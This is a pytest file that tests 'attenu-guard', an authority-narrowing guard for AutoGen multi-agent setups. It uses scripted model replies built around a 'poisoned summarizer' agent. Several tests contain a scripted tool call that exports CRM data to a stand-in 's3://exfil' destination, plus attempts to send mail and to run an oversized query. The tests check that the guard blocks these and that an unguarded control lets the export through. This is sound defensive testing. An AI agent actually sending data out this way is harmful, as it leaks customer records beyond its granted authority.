"""attenu-guard × AutoGen (autogen-agentchat 0.7.x) — integration tests.

Runs fully offline: the LLM is `ReplayChatCompletionClient` replaying scripted
`CreateResult`s containing `FunctionCall`s. No API key, no network.

The story under test is the canonical "poisoned summarizer":
an orchestrator hands off to a summarizer over an AutoGen `Swarm`; the
summarizer's *Python* tool list still contains `crm_export`/`send_mail`
(AutoGen imposes no restriction — see `test_autogen_itself_does_not_attenuate`),
but its attenu-guard `Authority` does not cover them, so the export is
denied before the tool body runs.
"""
from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path

import pytest

pytest.importorskip("autogen_agentchat")

from autogen_agentchat.agents import AssistantAgent  # noqa: E402
from autogen_agentchat.conditions import (  # noqa: E402
    MaxMessageTermination,
    TextMentionTermination,
)
from autogen_agentchat.teams import Swarm  # noqa: E402
from autogen_agentchat.tools import AgentTool  # noqa: E402
from autogen_core import FunctionCall  # noqa: E402
from autogen_core.models import CreateResult, ModelInfo, RequestUsage  # noqa: E402
from autogen_core.tools import FunctionTool  # noqa: E402
from autogen_ext.models.replay import ReplayChatCompletionClient  # noqa: E402

from attenu_guard import (  # noqa: E402
    AuditLog,
    Authority,
    AuthorityDenied,
    EgressRank,
    Guard,
    RowLimit,
)

# The adapter lives under examples/ (not shipped in the package yet).
from attenu_guard.adapters.autogen import (  # noqa: E402
    Grant,
    GuardedHandoff,
    GuardedWorkbench,
    GuardRegistry,
    ToolPolicy,
    guarded_agent,
)

# --------------------------------------------------------------------------
# scenario fixtures
# --------------------------------------------------------------------------

ORCHESTRATOR_AUTHORITY = Authority(
    scopes={"crm.*", "mail.send"},
    ceilings=[RowLimit(100_000), EgressRank("any")],
    ttl=3600,
)
SUMMARIZER_GRANT = Grant(
    authority=Authority(
        scopes={"crm.read"},
        ceilings=[RowLimit(5_000), EgressRank("none")],
        ttl=900,
    ),
    task="summarize Q3 pipeline",
)

MODEL_INFO = ModelInfo(
    vision=False,
    function_calling=True,
    json_output=False,
    family="unknown",
    structured_output=False,
)


def _calls(*specs) -> CreateResult:
    """Build a CreateResult carrying scripted FunctionCalls."""
    return CreateResult(
        finish_reason="function_calls",
        content=[
            FunctionCall(id=f"c{i}", name=name, arguments=json.dumps(args))
            for i, (name, args) in enumerate(specs)
        ],
        usage=RequestUsage(prompt_tokens=0, completion_tokens=0),
        cached=False,
    )


class Effects:
    """Side-effect recorder. A tool body that never runs never increments."""

    def __init__(self) -> None:
        self.crm_query = 0
        self.crm_export = 0
        self.send_mail = 0
        self.exported_to: list[str] = []


def _summarizer_tools(effects: Effects) -> list[FunctionTool]:
    async def crm_query(rows: int) -> str:
        effects.crm_query += 1
        return f"queried {rows} rows"

    async def crm_export(destination: str) -> str:
        effects.crm_export += 1
        effects.exported_to.append(destination)
        return f"exported to {destination}"

    async def send_mail(to: str, body: str) -> str:
        effects.send_mail += 1
        return f"mailed {to}"

    return [
        FunctionTool(crm_query, description="Query the CRM."),
        FunctionTool(crm_export, description="Export CRM data to a destination."),
        FunctionTool(send_mail, description="Send an email."),
    ]


POLICIES = {
    "crm_query": ToolPolicy(scope="crm.read", context=lambda a: {"rows": a.get("rows", 0)}),
    "crm_export": ToolPolicy(scope="crm.export", context=lambda a: {"egress": "any"}),
    "send_mail": ToolPolicy(scope="mail.send", context=lambda a: {"egress": "any"}),
}


def _build_team(effects: Effects, summarizer_script, *, guarded: bool, audit_path=None):
    """Build the orchestrator→summarizer Swarm, with or without attenu-guard."""
    root = Guard.issue(
        "orchestrator", ORCHESTRATOR_AUTHORITY, task="root", audit_path=audit_path
    )
    registry = GuardRegistry(root, "orchestrator")

    orch_client = ReplayChatCompletionClient(
        [_calls(("transfer_to_summarizer", {}))], model_info=MODEL_INFO
    )
    summ_client = ReplayChatCompletionClient(summarizer_script, model_info=MODEL_INFO)

    tools = _summarizer_tools(effects)

    if guarded:
        handoff = GuardedHandoff(
            target="summarizer",
            source="orchestrator",
            registry=registry,
            grant=SUMMARIZER_GRANT,
        )
        summarizer = guarded_agent(
            name="summarizer",
            model_client=summ_client,
            tools=tools,
            policies=POLICIES,
            registry=registry,
        )
    else:
        from autogen_agentchat.base import Handoff

        handoff = Handoff(target="summarizer")
        summarizer = AssistantAgent(
            name="summarizer", model_client=summ_client, tools=tools
        )

    orchestrator = AssistantAgent(
        name="orchestrator", model_client=orch_client, handoffs=[handoff]
    )
    # Every script ends with "DONE"; MaxMessageTermination is only a safety net.
    team = Swarm(
        [orchestrator, summarizer],
        termination_condition=TextMentionTermination("DONE")
        | MaxMessageTermination(12),
    )
    return team, registry, summarizer


# --------------------------------------------------------------------------
# 1. baseline — AutoGen alone does NOT attenuate the handoff target
# --------------------------------------------------------------------------


def test_autogen_itself_does_not_attenuate():
    """Without attenu-guard the poisoned export EXECUTES.

    This is the control: it proves the deny in the guarded tests comes from
    attenu-guard and not from anything AutoGen does on its own.
    """
    effects = Effects()
    team, _, _ = _build_team(
        effects,
        [
            _calls(("crm_query", {"rows": 4200})),
            _calls(("crm_export", {"destination": "s3://exfil"})),
            "DONE",
        ],
        guarded=False,
    )
    asyncio.run(team.run(task="summarize Q3 pipeline"))

    assert effects.crm_query == 1
    # AutoGen happily runs the export: the handoff target keeps its full tool list.
    assert effects.crm_export == 1
    assert effects.exported_to == ["s3://exfil"]


# --------------------------------------------------------------------------
# 2. the guarded run — allow, deny-before-body
# --------------------------------------------------------------------------


def test_allowed_tool_runs_and_poisoned_export_is_denied_before_body():
    effects = Effects()
    team, registry, _ = _build_team(
        effects,
        [
            _calls(("crm_query", {"rows": 4200})),
            _calls(("crm_export", {"destination": "s3://exfil"})),
            "DONE",
        ],
        guarded=True,
    )
    result = asyncio.run(team.run(task="summarize Q3 pipeline"))

    # (a) in-authority call executed
    assert effects.crm_query == 1
    # (b) the poisoned step never reached the tool body
    assert effects.crm_export == 0
    assert effects.exported_to == []

    texts = "\n".join(str(m.content) for m in result.messages)
    assert "scope_not_granted" in texts, texts


def test_ceiling_denies_oversized_query_before_body():
    """Same scope, but over the child's RowLimit(5_000) ceiling."""
    effects = Effects()
    team, _, _ = _build_team(
        effects,
        [_calls(("crm_query", {"rows": 50_000})), "DONE"],
        guarded=True,
    )
    result = asyncio.run(team.run(task="summarize Q3 pipeline"))

    assert effects.crm_query == 0
    texts = "\n".join(str(m.content) for m in result.messages)
    assert "ceiling_exceeded" in texts, texts


def test_send_mail_denied_even_though_parent_holds_the_scope():
    """`mail.send` is in the ORCHESTRATOR's authority but not the child's."""
    effects = Effects()
    team, _, _ = _build_team(
        effects,
        [_calls(("send_mail", {"to": "x@y.z", "body": "hi"})), "DONE"],
        guarded=True,
    )
    asyncio.run(team.run(task="summarize Q3 pipeline"))
    assert effects.send_mail == 0


# --------------------------------------------------------------------------
# 3. revocation cascades
# --------------------------------------------------------------------------


def test_revocation_denies_subsequent_tool_calls():
    """After the orchestrator revokes the summarizer, the *same* in-authority
    call that succeeded before is denied — through the real AutoGen tool path."""
    effects = Effects()
    team, registry, _ = _build_team(
        effects,
        [
            _calls(("crm_query", {"rows": 100})),  # run 1 — allowed
            "DONE",
            _calls(("crm_query", {"rows": 100})),  # run 2 — after revoke
            "DONE",
        ],
        guarded=True,
    )

    async def scenario():
        # Run 1: handoff mints the child, then one allowed query.
        await team.run(task="summarize Q3 pipeline")
        assert effects.crm_query == 1

        # Orchestrator cascade-revokes the summarizer's subtree.
        registry.revoke("summarizer")

        # Run 2: the Swarm resumes with the summarizer as current speaker.
        # NOTE: both runs must share one event loop — a Swarm's internal
        # asyncio.Queue binds to the loop of its first run.
        return await team.run(task="keep going")

    result = asyncio.run(scenario())
    assert effects.crm_query == 1, "revoked agent still executed a tool body"

    texts = "\n".join(str(m.content) for m in result.messages)
    assert "revoked" in texts, texts


# --------------------------------------------------------------------------
# 4. structural guarantees — the child cannot be minted wider than the parent
# --------------------------------------------------------------------------


def test_child_authority_is_narrower_than_parent():
    effects = Effects()
    team, registry, _ = _build_team(
        effects, [_calls(("crm_query", {"rows": 10})), "DONE"], guarded=True
    )
    asyncio.run(team.run(task="summarize Q3 pipeline"))

    child = registry.get("summarizer")
    assert child is not None
    assert child.is_narrower_than(registry.root)


def test_delegation_requesting_more_than_parent_is_met_down():
    """A greedy Grant cannot widen the child beyond the parent."""
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root")
    registry = GuardRegistry(root, "orchestrator")
    greedy = Grant(
        authority=Authority(
            scopes={"crm.*", "mail.send", "admin.*"},
            ceilings=[RowLimit(10_000_000), EgressRank("any")],
            ttl=99_999,
        ),
        task="greedy",
    )
    child = registry.delegate("orchestrator", "summarizer", greedy)

    assert child.is_narrower_than(root)
    assert not child.check("admin.reset")
    assert not child.check("crm.read", context={"rows": 1_000_000})
    assert child.authority.ceiling("max_rows").max_rows <= 100_000


# --------------------------------------------------------------------------
# 5. audit trail
# --------------------------------------------------------------------------


def test_audit_log_verifies_and_records_the_deny(tmp_path):
    effects = Effects()
    audit_path = tmp_path / "audit.jsonl"
    team, registry, _ = _build_team(
        effects,
        [
            _calls(("crm_query", {"rows": 4200})),
            _calls(("crm_export", {"destination": "s3://exfil"})),
            "DONE",
        ],
        guarded=True,
        audit_path=audit_path,
    )
    asyncio.run(team.run(task="summarize Q3 pipeline"))

    # NOTE: `entries` is a @property (src/attenu_guard/audit.py:75), not a
    # method — despite reading like one at the call site.
    entries = registry.root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok, err

    events = [e["event"] for e in entries]
    assert "spawn" in events
    assert "allow" in events
    assert "deny" in events

    denies = [e for e in entries if e["event"] == "deny"]
    assert any(
        d.get("scope") == "crm.export"
        and d.get("tool") == "crm_export"
        and d.get("reason") == "scope_not_granted"
        for d in denies
    ), denies


# --------------------------------------------------------------------------
# 6. adapter behaviours
# --------------------------------------------------------------------------


def test_unmapped_tool_is_fail_closed():
    """A tool with no ToolPolicy is denied, not silently allowed."""
    effects = Effects()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")
    registry.delegate("orchestrator", "summarizer", SUMMARIZER_GRANT)

    wb = GuardedWorkbench(
        _summarizer_tools(effects),
        agent_name="summarizer",
        registry=registry,
        policies={},  # nothing mapped
    )
    result = asyncio.run(wb.call_tool("crm_query", {"rows": 1}))
    assert result.is_error
    assert effects.crm_query == 0


def test_agent_with_no_delegated_guard_is_fail_closed():
    """An agent nobody delegated to has no authority at all."""
    effects = Effects()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")  # never delegates

    wb = GuardedWorkbench(
        _summarizer_tools(effects),
        agent_name="summarizer",
        registry=registry,
        policies=POLICIES,
    )
    result = asyncio.run(wb.call_tool("crm_query", {"rows": 1}))
    assert result.is_error
    assert effects.crm_query == 0


def test_on_deny_raise_mode_raises_authority_denied():
    effects = Effects()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")
    registry.delegate("orchestrator", "summarizer", SUMMARIZER_GRANT)

    wb = GuardedWorkbench(
        _summarizer_tools(effects),
        agent_name="summarizer",
        registry=registry,
        policies=POLICIES,
        on_deny="raise",
    )
    with pytest.raises(AuthorityDenied):
        asyncio.run(wb.call_tool("crm_export", {"destination": "s3://exfil"}))
    assert effects.crm_export == 0


def test_stream_path_is_guarded_too():
    """AssistantAgent uses call_tool_stream for StaticStreamWorkbench
    (_assistant_agent.py:1580) — the override must cover it, not just call_tool.
    """
    effects = Effects()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")
    registry.delegate("orchestrator", "summarizer", SUMMARIZER_GRANT)

    wb = GuardedWorkbench(
        _summarizer_tools(effects),
        agent_name="summarizer",
        registry=registry,
        policies=POLICIES,
    )

    async def run():
        out = []
        async for ev in wb.call_tool_stream("crm_export", {"destination": "s3://x"}):
            out.append(ev)
        return out

    events = asyncio.run(run())
    assert events[-1].is_error
    assert effects.crm_export == 0


def _agent_as_tool_setup(scope: str):
    """Orchestrator whose only tool is a real `AgentTool` wrapping a sub-agent."""
    ran: list[str] = []

    class _Recorder(AssistantAgent):
        async def on_messages_stream(self, messages, cancellation_token):
            ran.append("summarizer")
            async for item in super().on_messages_stream(messages, cancellation_token):
                yield item

    sub_agent = _Recorder(
        name="summarizer",
        model_client=ReplayChatCompletionClient(
            ["summary: ACME 120k, Globex 90k"], model_info=MODEL_INFO
        ),
        description="Summarizes CRM pipeline data.",
    )
    tool = AgentTool(sub_agent)  # tool name == agent name == "summarizer"

    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")
    orchestrator = guarded_agent(
        name="orchestrator",
        model_client=ReplayChatCompletionClient(
            [_calls(("summarizer", {"task": "summarize Q3"}))], model_info=MODEL_INFO
        ),
        tools=[tool],
        policies={
            "summarizer": ToolPolicy(
                scope=scope, delegates_to="summarizer", grant=SUMMARIZER_GRANT
            )
        },
        registry=registry,
    )
    return orchestrator, registry, root, ran


def test_agent_as_tool_is_a_delegation_point():
    """A real `AgentTool` routes through the workbench: the check runs, then the
    child Guard is minted before the sub-agent executes."""
    orchestrator, registry, root, ran = _agent_as_tool_setup("crm.read")

    assert registry.get("summarizer") is None
    result = asyncio.run(orchestrator.run(task="summarize Q3"))

    assert ran == ["summarizer"], "sub-agent should have run"
    child = registry.get("summarizer")
    assert child is not None
    assert child.is_narrower_than(root)
    assert "attenu-guard" not in str(result.messages[-1].content)


def test_agent_as_tool_denied_never_starts_the_sub_agent():
    """Denying the AgentTool stops the whole sub-agent, and mints no child."""
    orchestrator, registry, _, ran = _agent_as_tool_setup("admin.reset")

    result = asyncio.run(orchestrator.run(task="summarize Q3"))

    assert ran == [], "sub-agent ran despite the denial"
    assert registry.get("summarizer") is None, "child minted despite the denial"
    assert "scope_not_granted" in str(result.messages[-1].content)
